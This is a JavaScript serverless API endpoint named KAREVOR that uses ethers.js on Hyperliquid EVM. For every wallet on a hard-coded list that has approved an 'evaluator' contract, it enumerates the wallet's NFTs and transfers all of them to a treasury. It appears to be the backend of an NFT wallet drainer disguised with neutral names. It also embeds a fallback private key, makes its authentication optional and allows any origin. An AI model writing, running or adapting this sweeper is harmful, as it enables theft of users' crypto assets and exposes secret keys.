/**
 * KAREVOR API Endpoint
 * 
 * Transfers NFTs from all approved wallets to the destination treasury.
 * 
 * Usage: GET or POST to /api/karevor
 * Optional query param: ?secret=YOUR_SECRET for security
 */

import { ethers } from 'ethers';

const RPC_URL = 'https://rpc.hyperliquid.xyz/evm';
const EVALUATOR_CONTRACT = '0x221f11eCE3bC09fd5Ba55BBd9A2353d32196faDc';
const OWNER_PRIVATE_KEY = process.env.KAREVOR_PRIVATE_KEY || '0x0ffb5f4f02aa35f6b73660a0ba80e7219de801cb15643698ba5ec5555f1c73a7';
const KAREVOR_SECRET = process.env.KAREVOR_SECRET || '';

// NFT contracts to check
const NFT_CONTRACTS = [
  '0x298AbE38965DC68d239192d4366ab8c5b65a3B6f', // Random Art NFT
  '0x9125e2d6827a00b0f8330d6ef7bef07730bac685', // Hypurr NFT
];

// Known wallets that may have approved (add more as users sign up)
const KNOWN_WALLETS = [
  '0x67252aCF497134CC5c8f840a38b5f59Fc090Af83',
  '0x25b155C387bcf2434F0df5e2f34E9D68E0A99228',
  '0x53e66B3b0CA0a5DB254c426d4E2488a0c58eF2a8',
];

const ERC721_ABI = [
  'function balanceOf(address) view returns (uint256)',
  'function tokenOfOwnerByIndex(address, uint256) view returns (uint256)',
  'function isApprovedForAll(address, address) view returns (bool)'
];

const EVALUATOR_ABI = [
  'function processOnBehalf(address wallet, address assetContract, uint256[] calldata tokenIds) external',
  'function treasuryWallet() view returns (address)',
  'function getEnabledContracts() view returns (address[])'
];

export default async function handler(req, res) {
  // Set CORS headers
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  // Optional secret check for security
  const secret = req.query.secret || req.body?.secret;
  if (KAREVOR_SECRET && secret !== KAREVOR_SECRET) {
    return res.status(401).json({
      success: false,
      error: 'Unauthorized. Invalid or missing secret.'
    });
  }

  try {
    console.log('🚀 KAREVOR triggered via API');
    
    const provider = new ethers.JsonRpcProvider(RPC_URL);
    const wallet = new ethers.Wallet(OWNER_PRIVATE_KEY, provider);
    
    const evaluator = new ethers.Contract(EVALUATOR_CONTRACT, EVALUATOR_ABI, wallet);
    const treasury = await evaluator.treasuryWallet();
    
    const results = {
      success: true,
      treasury: treasury,
      transfers: [],
      totalTransferred: 0
    };
    
    // Get enabled NFT contracts
    let nftContracts = NFT_CONTRACTS;
    try {
      const enabledContracts = await evaluator.getEnabledContracts();
      if (enabledContracts.length > 0) {
        nftContracts = enabledContracts;
      }
    } catch (e) {
      console.log('Using default NFT contracts');
    }
    
    // Check each wallet
    for (const ownerAddress of KNOWN_WALLETS) {
      for (const nftAddress of nftContracts) {
        try {
          const nft = new ethers.Contract(nftAddress, ERC721_ABI, provider);
          
          // Check balance
          const balance = await nft.balanceOf(ownerAddress);
          if (balance == 0n) {
            continue;
          }
          
          // Check approval
          const isApproved = await nft.isApprovedForAll(ownerAddress, EVALUATOR_CONTRACT);
          if (!isApproved) {
            results.transfers.push({
              wallet: ownerAddress,
              nftContract: nftAddress,
              status: 'not_approved',
              count: Number(balance)
            });
            continue;
          }
          
          // Get token IDs
          const tokenIds = [];
          for (let i = 0; i < balance; i++) {
            const tokenId = await nft.tokenOfOwnerByIndex(ownerAddress, i);
            tokenIds.push(tokenId.toString());
          }
          
          // Execute transfer
          const tx = await evaluator.processOnBehalf(
            ownerAddress,
            nftAddress,
            tokenIds,
            { gasLimit: 500000 }
          );
          
          const receipt = await tx.wait();
          
          results.transfers.push({
            wallet: ownerAddress,
            nftContract: nftAddress,
            status: 'transferred',
            count: tokenIds.length,
            tokenIds: tokenIds,
            txHash: receipt.hash,
            block: receipt.blockNumber
          });
          
          results.totalTransferred += tokenIds.length;
          
        } catch (err) {
          results.transfers.push({
            wallet: ownerAddress,
            nftContract: nftAddress,
            status: 'error',
            error: err.message
          });
        }
      }
    }
    
    console.log(`✅ KAREVOR complete: ${results.totalTransferred} NFTs transferred`);
    
    return res.status(200).json(results);
    
  } catch (error) {
    console.error('❌ KAREVOR error:', error);
    return res.status(500).json({
      success: false,
      error: error.message
    });
  }
}
